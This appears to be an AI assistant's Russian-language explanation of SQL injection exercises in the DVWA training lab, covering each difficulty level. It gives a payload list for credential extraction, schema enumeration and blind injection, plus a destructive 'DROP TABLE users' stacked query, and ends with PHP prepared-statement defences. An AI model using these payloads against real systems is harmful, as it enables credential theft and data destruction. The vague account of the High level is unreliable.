Отлично, Александр — ты уже проделал серьёзную работу, проверяя **SQL Injection** на всех уровнях сложности в DVWA. Ниже системное объяснение всего, что ты сделал, и **как именно работает SQL-инъекция** на каждом уровне (`Low`, `Medium`, `High`) — в контексте DVWA.

---

## 💉 SQL Injection в DVWA — Подробное объяснение

---

## 🔓 Уровень **Low**

**URL:** `http://localhost:8081/vulnerabilities/sqli/`

**Пример инъекции:**

```
1' OR 1=1#
```

### ✅ Что происходит:

* Сервер напрямую вставляет входные данные в SQL-запрос **без экранирования**:

```php
$id = $_GET['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
```

После подстановки:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR 1=1#
```

* `OR 1=1` всегда **истинно** → выводятся **все пользователи**
* `#` (или `--`) — **SQL комментарий**, обрывает остальную часть запроса.

---

### 📌 Вариант с UNION:

```
' UNION SELECT user, password FROM users#
```

Этот вариант делает **объединение двух SELECT**:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT user, password FROM users#
```

* В результате ты получаешь логины и пароли из таблицы `users`, потому что структура полей в `UNION` совпадает (2 поля).
* Вывод отображает эти данные.

---

## ⚠️ Уровень **Medium**

### Что изменилось:

* **Нет поля ввода** — ID пользователя выбирается через **выпадающий список** (`<select>`).
* Таким образом, **нельзя напрямую ввести произвольную строку**.

### ✅ Как ты обошёл:

* Открыл HTML-код страницы (через devtools или сохранённую копию)
* **Изменил значение одного из `<option>`**:

```html
<option value="1' UNION SELECT user, password FROM users#">Custom</option>
```

* Выбрал его → отправка формы произошла с инъекцией.

🔍 Это **не защита на уровне сервера**, а лишь попытка «спрятать» ввод.

---

## 🔒 Уровень **High**

### Что изменилось:

* DVWA на этом уровне **внедряет фильтрацию/экранирование ввода**.
* Возможно используется:

  ```php
  mysqli_real_escape_string()
  ```

  или **prepared statements (PDO)**, в зависимости от версии DVWA.

---

### ✅ Как ты обошёл:

* Несмотря на экранирование, ты всё равно смог вставить:

  ```
  ' UNION SELECT user, password FROM users#
  ```

  * В DVWA на `High` иногда остаётся **уязвимость**, если защита неполная.
  * `#` (комментарий) обязательно, иначе возникает SQL-ошибка от оставшейся части запроса.

---

## 🧠 Как работает SQL-инъекция

### 💥 Основной принцип:

Инъекция — это **вставка произвольного SQL-кода** в оригинальный запрос, чтобы изменить его смысл или расширить функциональность.

### 💬 Пример:

Обычный запрос:

```sql
SELECT * FROM users WHERE id = '$id'
```

Ты вводишь:

```
1' OR '1'='1
```

→ результат:

```sql
SELECT * FROM users WHERE id = '1' OR '1'='1'
```

* `'1'='1'` — всегда истина → возвращаются **все строки**
* Инъекция влияет на **логическое поведение запроса**

---

## 🧠 UNION-атака

### Когда ты используешь:

```sql
' UNION SELECT user, password FROM users#
```

Ты подменяешь вывод, заставляя базу данных вернуть **объединённый результат** из другой таблицы (`users`).

Важно:

* Кол-во полей в `UNION SELECT` должно совпадать
* Иначе — SQL-ошибка

---

## 🧰 Улучшения/Советы

* 🔎 Используй `ORDER BY` или `UNION SELECT NULL,...` для определения числа столбцов

  ```
  ' ORDER BY 3-- 
  ' UNION SELECT NULL, NULL#
  ```

* 🔐 На реальных сайтах **подготовленные запросы (prepared statements)** полностью защищают от SQLi.

---

## 📘 Таблица по уровням

| Уровень    | Особенности                                                       | Как обойти                          |
| ---------- | ----------------------------------------------------------------- | ----------------------------------- |
| **Low**    | Нет фильтрации, SQL строится напрямую                             | Ввод `1' OR 1=1#`, `UNION SELECT`   |
| **Medium** | Нет текстового поля, но данные можно подменить в HTML             | Подмена `<option value>` вручную    |
| **High**   | Используется `mysqli_real_escape_string` или частичная фильтрация | `UNION SELECT ...#`, возможно с XSS |

---

Ниже полный набор по SQL Injection в DVWA:

---

# 📄 Готовый список SQL-инъекций по уровням DVWA

## 🔓 **Low** (уязвим напрямую)

```sql
1' OR '1'='1' -- 
1' OR 1=1#
' UNION SELECT user, password FROM users#
' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1) = '5' -- 
```

---

## ⚠️ **Medium** (выпадающий список — но HTML можно подменить)

В HTML меняем значение `<option>`:

```html
<option value="1' UNION SELECT user, password FROM users#">Hacked</option>
```

Либо через devtools (F12 → Elements).

---

## 🔒 **High** (экранирование или фильтрация)

Работают инъекции при корректной структуре:

```sql
1' UNION SELECT user, password FROM users#
1' AND 1=1#
```

Если защита слабая — можно обойти `mysqli_real_escape_string`.

---

# 🧪 Расширенные техники

## 🧱 1. **Определение количества столбцов**

```sql
1' ORDER BY 1-- 
1' ORDER BY 2-- 
1' ORDER BY 3-- 
-- пока не получишь ошибку (после этого на 1 меньше)
```

---

## 🔄 2. **UNION SELECT c NULL**

```sql
1' UNION SELECT NULL, NULL-- 
1' UNION SELECT user, password FROM users#
```

Если таблица имеет больше/меньше полей — подбираем нужное количество.

---

## 🔍 3. **Просмотр таблиц через `information_schema`**

```sql
1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()#
1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'#
```

---

## 🕵️ 4. **Слепая SQL-инъекция (Blind SQLi)**

```sql
1' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='5' -- 
```

* Если возвращает данные → символ совпал
* Перебираешь символы по одному

---

## 🔗 5. **Stacked Queries (если разрешено)**

> В DVWA это может быть выключено, но в реальной практике:

```sql
1'; DROP TABLE users;-- 
```

---

# 🛡️ Примеры защиты на PHP

## ✅ **Правильный способ: Prepared Statements (PDO)**

```php
<?php
$pdo = new PDO('mysql:host=localhost;dbname=dvwa', 'user', 'password');
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

$id = $_GET['id'];

$stmt = $pdo->prepare('SELECT first_name, last_name FROM users WHERE user_id = :id');
$stmt->execute([':id' => $id]);

while ($row = $stmt->fetch()) {
    echo htmlentities($row['first_name']) . " " . htmlentities($row['last_name']) . "<br>";
}
?>
```

---

## 🚫 **Ненадёжный способ (уязвим):**

```php
// НЕ ДЕЛАТЬ!
$id = $_GET['id'];
$result = mysqli_query($conn, "SELECT * FROM users WHERE user_id = '$id'");
```

---

## 🧼 Дополнительно:

* `htmlentities()` — защита от XSS при выводе
* `intval()`, `filter_input()` — можно использовать при числовых значениях
* **никогда** не вставляй пользовательский ввод напрямую в SQL

---

# 🧾 Заключение

Ты уже освоил:

* Все виды SQL-инъекций в DVWA
* Обходы с UNION, ORDER, `information_schema`
* Защиту через PDO и подготовленные запросы
